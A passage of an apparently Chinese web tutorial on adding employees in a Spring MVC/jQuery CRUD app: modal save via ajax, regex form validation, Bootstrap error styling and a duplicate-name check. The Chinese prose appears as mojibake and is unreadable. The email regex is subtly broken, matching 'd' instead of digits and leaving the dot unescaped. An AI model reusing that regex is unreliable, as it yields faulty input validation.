href="https://v3.bootcss.com/javascript/#modals-methods" target="_blank" rel="noopener">bootstarpæ¨¡æ€æ¡†</a><br>æ‰¾åˆ°å…³é—­æ¨¡æ€æ¡†çš„æ–¹æ³•<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#empAddModal"</span>).modal(<span class="string">'hide'</span>);</span><br></pre></td></tr></table></figure></p><p>æ¥åˆ°æœ€åä¸€é¡µè¦é¢ä¸´ä¸€ä¸ªé—®é¢˜å°±æ˜¯å½“è¯¥é¡µå·²ç»æœ‰5ä¸ªæ•°æ®ï¼Œå†æ·»åŠ ä¸€ä¸ªæ•°æ®ï¼Œé¡µç å°±ä¼šåŠ ä¸€ï¼Œè¿™ä¸ªæ—¶å€™ä¸ç”¨æ‹…å¿ƒï¼Œæ’ä»¶ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬å®Œæˆï¼Œæˆ‘ä»¬åªéœ€è¦å‘é€ajaxè¯·æ±‚æœ€åä¸€é¡µæ•°æ®å³å¯ï¼Œä½†æ˜¯åˆæ‹…å¿ƒè°ƒç”¨to_pageæ–¹æ³•ä¸å¤Ÿä¿é™©ï¼Œå°±å¯ä»¥è¯·æ±‚æ€»è®°å½•æ•°å½“é¡µç </p><p>å®šä¹‰ä¸€ä¸ªå…¨å±€éå†totalRecords<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">totalRecords</span> = result.extend.pageInfo.total<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>ç„¶åç”¨to_pageè¯·æ±‚å°±å¥½äº†<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">to</span><span class="constructor">_page(<span class="params">totalRecords</span>)</span>;</span><br></pre></td></tr></table></figure></p><p>å®Œæ•´çš„ä¿å­˜<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line">    <span class="comment">//2.å‘é€ajaxè¯·æ±‚ä¿å­˜å‘˜å·¥</span></span><br><span class="line">    <span class="comment">// alert($("#empAddModal form").serialize());</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp"</span>,</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        data:$(<span class="string">"#empAddModal form"</span>).serialize(),</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//alert(result.msg);</span></span><br><span class="line">            <span class="comment">//å‘˜å·¥ä¿å­˜æˆåŠŸï¼š</span></span><br><span class="line">            <span class="comment">//1. å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line">            $(<span class="string">"#empAddModal"</span>).modal(<span class="string">'hide'</span>);</span><br><span class="line">            <span class="comment">//2. æ¥åˆ°æœ€åä¸€é¡µï¼Œæ˜¾ç¤ºåˆšæ‰ä¿å­˜çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//å‘é€ajaxè¯·æ±‚æ˜¾ç¤ºæœ€åä¸€é¡µæ•°æ®å³å¯</span></span><br><span class="line">            <span class="comment">//å¯ä»¥å°†æ€»è®°å½•æ•°å½“ä½œé¡µç </span></span><br><span class="line">            to_page(totalRecords);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸‹ç‚¹å‡»ä¿å­˜ä¹‹åï¼Œå°±ä¼šè‡ªåŠ¨è·³è½¬åˆ°æœ€åä¸€é¡µå¹¶å…³é—­æ¨¡æ€æ¡†äº†</p><p>ä½†æ˜¯ç›®å‰åªæ˜¯åŸºæœ¬å®Œæˆäº†ä¿å­˜åŠŸèƒ½ï¼Œä½†æ˜¯æ²¡æœ‰æ ¡éªŒè¾“å…¥çš„ä¿¡æ¯ï¼Œè¿™å°±éœ€è¦ç¼–å†™ä¸€ä¸‹å¨‡è‰³çš„é€»è¾‘äº†</p><h2 id="æ ¡éªŒ"><a href="#æ ¡éªŒ" class="headerlink" title="æ ¡éªŒ"></a>æ ¡éªŒ</h2><h3 id="åˆæ³•æ€§æ ¡éªŒ"><a href="#åˆæ³•æ€§æ ¡éªŒ" class="headerlink" title="åˆæ³•æ€§æ ¡éªŒ"></a>åˆæ³•æ€§æ ¡éªŒ</h3><p>è¾“å…¥æ•°æ®ä»¥åä¸èƒ½ç›´æ¥å®Œæˆä¿å­˜ï¼Œå¿…é¡»è¦è¿›è¡Œæ ¡éªŒ</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//æ ¡éªŒè¡¨å•æ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validata_add_form</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//1. æ‹¿åˆ°è¦æ£€éªŒçš„æ•°æ®ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">    <span class="keyword">var</span> empName = $(<span class="string">"#empName_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regName = <span class="regexp">/(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/</span>;</span><br><span class="line">    <span class="keyword">if</span>(!regName.test(empName))&#123;</span><br><span class="line">        alert(<span class="string">"ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//2. æ ¡éªŒé‚®ç®±ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        alert(<span class="string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‚¹å‡»ä¿å­˜ï¼Œä¿å­˜å‘˜å·¥</span></span><br><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line">    <span class="comment">//2.å…ˆå¯¹è¦æäº¤ç»™æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line">    <span class="keyword">if</span>(!validata_add_form())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬çš„é€»è¾‘å°±å®Œæˆäº†ï¼Œç”¨æˆ·åå’Œé‚®ç®±éƒ½éœ€è¦æ­£ç¡®æ‰å…è®¸æäº¤ajaxè¯·æ±‚</p><p>ä½†æ˜¯alertå¤ªéš¾çœ‹äº†ï¼Œå¯ä»¥åœ¨<a href="https://v3.bootcss.com/css/#forms-control-validation" target="_blank" rel="noopener">bootstrapè¡¨å•</a>æ ¡éªŒçŠ¶æ€æ‰¾åˆ°ç›¸åº”çš„æ“ä½œ</p><p>æˆ‘ä»¬æŠ½å–ä¸€ä¸ªæ–¹æ³•show_validate_msg</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> show<span class="constructor">_validate_msg(<span class="params">ele</span>,<span class="params">status</span>,<span class="params">msg</span>)</span>&#123;</span><br><span class="line">       <span class="comment">//æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line">       <span class="constructor">$(<span class="params">ele</span>)</span>.parent<span class="literal">()</span>.remove<span class="constructor">Class(<span class="string">"has-success has-error"</span>)</span>;</span><br><span class="line">       <span class="constructor">$(<span class="params">ele</span>)</span>.next(<span class="string">"span"</span>).text(<span class="string">""</span>);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(status<span class="operator"> == </span><span class="string">"success"</span>)&#123;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.parent<span class="literal">()</span>.add<span class="constructor">Class(<span class="string">"has-success"</span>)</span>;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.next(<span class="string">"span"</span>).text(msg);</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(status<span class="operator"> == </span><span class="string">"error"</span>)&#123;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.parent<span class="literal">()</span>.add<span class="constructor">Class(<span class="string">"has-error"</span>)</span>;</span><br><span class="line">           <span class="constructor">$(<span class="params">ele</span>)</span>.next(<span class="string">"span"</span>).text(msg);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>validata_add_formä¹Ÿè¦ä¿®æ”¹</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¡éªŒè¡¨å•æ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validata_add_form</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//1. æ‹¿åˆ°è¦æ£€éªŒçš„æ•°æ®ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">    <span class="keyword">var</span> empName = $(<span class="string">"#empName_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regName = <span class="regexp">/(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/</span>;</span><br><span class="line">    <span class="keyword">if</span>(!regName.test(empName))&#123;</span><br><span class="line">        <span class="comment">// alert("ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line">        <span class="comment">//æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line">        show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,<span class="string">"ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. æ ¡éªŒé‚®ç®±ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">var</span> email = $(<span class="string">"#email_add_input"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> regEmaill = <span class="regexp">/^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!regEmaill.test(email))&#123;</span><br><span class="line">        <span class="comment">// alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line">        show_validate_msg(<span class="string">"#email_add_input"</span>,<span class="string">"error"</span>,<span class="string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_validate_msg(<span class="string">"#email_add_input"</span>,<span class="string">"success"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªå¥½çœ‹çš„æ£€éªŒä¿¡æ¯ï¼Œä½†æ˜¯ç°åœ¨åªæ˜¯æ ¡éªŒäº†åˆæ³•æ€§ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æŸ¥é‡ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±éœ€è¦è¿›è¡Œä¸€ä¸ªæŸ¥é‡çš„æ ¡éªŒ</p><h3 id="é‡å¤æ ¡éªŒ"><a href="#é‡å¤æ ¡éªŒ" class="headerlink" title="é‡å¤æ ¡éªŒ"></a>é‡å¤æ ¡éªŒ</h3><p>åŸºæœ¬é€»è¾‘å°±æ˜¯å½“æŸ¥åˆ°é‡å¤çš„æ—¶å€™è¦æç¤ºå‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”ä¸èƒ½ä¿å­˜ï¼Œåˆ©ç”¨changeäº‹ä»¶æ¥ç¼–å†™</p><p>é¦–å…ˆéœ€è¦ç¼–å†™ä¸€ä¸ªcheckUseræ–¹æ³•</p><p>åœ¨EmployeeControllerä¸­æ·»åŠ <br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"/checkUser"</span>)</span></span><br><span class="line"><span class="keyword">public</span> Msg checkUser(<span class="meta">@RequestParam(<span class="meta-string">"empName"</span>)</span> String empName)&#123;</span><br><span class="line">    boolean b = employeeService.checkUser(empName);</span><br><span class="line">    <span class="keyword">if</span>(b)&#123;</span><br><span class="line">        <span class="keyword">return</span> Msg.success();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Msg.fail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯¹åº”çš„Serviceä¸­æ·»åŠ <br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public boolean check<span class="constructor">User(String <span class="params">empName</span>)</span> &#123;</span><br><span class="line">    EmployeeExample example = <span class="keyword">new</span> <span class="constructor">EmployeeExample()</span>;</span><br><span class="line">    EmployeeExample.Criteria criteria = example.create<span class="constructor">Criteria()</span>;</span><br><span class="line">    criteria.<span class="keyword">and</span><span class="constructor">EmpNameEqualTo(<span class="params">empName</span>)</span>;</span><br><span class="line">    long count = employeeMapper.count<span class="constructor">ByExample(<span class="params">example</span>)</span>;</span><br><span class="line">    return count==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ¥ç€åœ¨index.jspä¸­æ·»åŠ ä¸Š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line">$(<span class="string">"#empName_add_input"</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//å‘é€ajaxè¯·æ±‚æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line">    <span class="keyword">var</span> empName = <span class="keyword">this</span>.value;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/checkUser"</span>,</span><br><span class="line">        data:<span class="string">"empName="</span>+empName,</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result.code == <span class="number">200</span>)&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"success"</span>,<span class="string">"ç”¨æˆ·åå¯ç”¨"</span>);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"success"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,<span class="string">"ç”¨æˆ·åä¸å¯ç”¨"</span>);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>è¿™é‡Œåˆ©ç”¨ä¸€ä¸ªè‡ªå®šä¹‰çš„å±æ€§ajax-vaæ¥åˆ¤æ–­æ˜¯å¦å¯ç”¨<br>ä¿å­˜äº‹ä»¶ä¹Ÿè¦æ·»åŠ ä¸Š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#emp_save_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line">    <span class="comment">//2.å…ˆå¯¹è¦æäº¤ç»™æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line">    <span class="keyword">if</span>(!validata_add_form())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//3.åˆ¤æ–­ä¹‹å‰çš„ajaxç”¨æˆ·åæ ¡éªŒæ˜¯å¦æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span>($(<span class="keyword">this</span>).attr(<span class="string">"ajax-va"</span>)==<span class="string">"error"</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p><p>å› ä¸ºä½¿ç”¨çš„æ˜¯changeäº‹ä»¶ï¼Œåªæœ‰å†…å®¹å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œæ‰ä¼šæ‰§è¡Œæ­¤æ ¡éªŒï¼Œæ‰€ä»¥ä¸ºäº†é˜²æ­¢ç»•è¿‡è¯¥æ ¡éªŒä¿¡æ¯ï¼Œå°±éœ€è¦æ¯æ¬¡æäº¤åéƒ½é‡ç½®è¡¨å•<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#emp_add_modal_btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//æ¸…é™¤æ•°æ®ï¼Œè¡¨å•é‡ç½®</span></span><br><span class="line">    $(<span class="string">"#empAddModal form"</span>)[<span class="number">0</span>].reset();</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·ä¸€æ¥ï¼Œä¸€ä¸ªå®Œæ•´çš„å‰ç«¯æ ¡éªŒå°±å®Œæˆäº†</p><h3 id="å‰ç«¯æ ¡éªŒ"><a href="#å‰ç«¯æ ¡éªŒ" class="headerlink" title="å‰ç«¯æ ¡éªŒ"></a>å‰ç«¯æ ¡éªŒ</h3><p>ä¾æ—§æ˜¯ç”¨æ­£åˆ™è¡¨è¾¾å¼<br>åœ¨EmployeeControllerä¸­ä¿®æ”¹checkUser<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="meta">@RequestMapping(<span class="meta-string">"/checkUser"</span>)</span></span><br><span class="line">   <span class="keyword">public</span> Msg checkUser(<span class="meta">@RequestParam(<span class="meta-string">"empName"</span>)</span> String empName)&#123;</span><br><span class="line">       <span class="comment">//å…ˆåˆ¤æ–­ç”¨æˆ·åæ˜¯å¦æ˜¯åˆæ³•çš„è¡¨è¾¾å¼;</span></span><br><span class="line">       String regx = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span>;</span><br><span class="line">       <span class="keyword">if</span>(!empName.matches(regx))&#123;</span><br><span class="line">           <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"ç”¨æˆ·åå¿…é¡»æ˜¯6åˆ°16ä½æ•°å­—å’Œå­—æ¯çš„ç»„åˆæˆ–2-5ä½ä¸­æ–‡"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//æ•°æ®åº“ç”¨æˆ·åé‡å¤æ ¡éªŒ</span></span><br><span class="line">       boolean b = employeeService.checkUser(empName);</span><br><span class="line">       <span class="keyword">if</span>(b)&#123;</span><br><span class="line">           <span class="keyword">return</span> Msg.success();</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">return</span> Msg.fail().add(<span class="string">"va_msg"</span>,<span class="string">"ç”¨æˆ·åä¸å¯ç”¨"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><br>åŒæ—¶ä¿®æ”¹index.jsp<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line">$(<span class="string">"#empName_add_input"</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//å‘é€ajaxè¯·æ±‚æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line">    <span class="keyword">var</span> empName = <span class="keyword">this</span>.value;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/checkUser"</span>,</span><br><span class="line">        data:<span class="string">"empName="</span>+empName,</span><br><span class="line">        type:<span class="string">"POST"</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(result.code == <span class="number">200</span>)&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"success"</span>,<span class="string">"ç”¨æˆ·åå¯ç”¨"</span>);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"success"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                show_validate_msg(<span class="string">"#empName_add_input"</span>,<span class="string">"error"</span>,result.extend.va_msg);</span><br><span class="line">                $(<span class="string">"#emp_save_btn"</span>).attr(<span class="string">"ajax-va"</span>,<span class="string">"error"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>åŒæ—¶è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¸…æ¥šæ‰è¡¨å•çš„æ ·å¼</p><p>æŠ½å–ä¸€ä¸ªæ–¹æ³•reset_form<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ¸…ç©ºè¡¨å•æ ·å¼åŠå†…å®¹</span></span><br><span class="line"><span class="keyword">function</span> reset<span class="constructor">_form(<span class="params">ele</span>)</span>&#123;</span><br><span class="line">    <span class="constructor">$(<span class="params">ele</span>)</span><span class="literal">[<span class="number">0</span>]</span>.reset<span class="literal">()</span>;</span><br><span class="line">    <span class="comment">//æ¸…ç©ºæ ·å¼</span></span><br><span class="line">    <span class="constructor">$(<span class="params">ele</span>)</span>.find(<span class="string">"*"</span>).remove<span class="constructor">Class(<span class="string">"has-success has-error"</span>)</span>;</span><br><span class="line">    <span class="constructor">$(<span class="params">ele</span>)</span>.find(<span class="string">".help-block"</span>).text(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¼¹å‡ºæ¨¡æ€æ¡†çš„äº‹ä»¶ä¹Ÿè¦ä¿®æ”¹<br><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#emp_add_modal_btn"</span>).click(<span class="function"><span 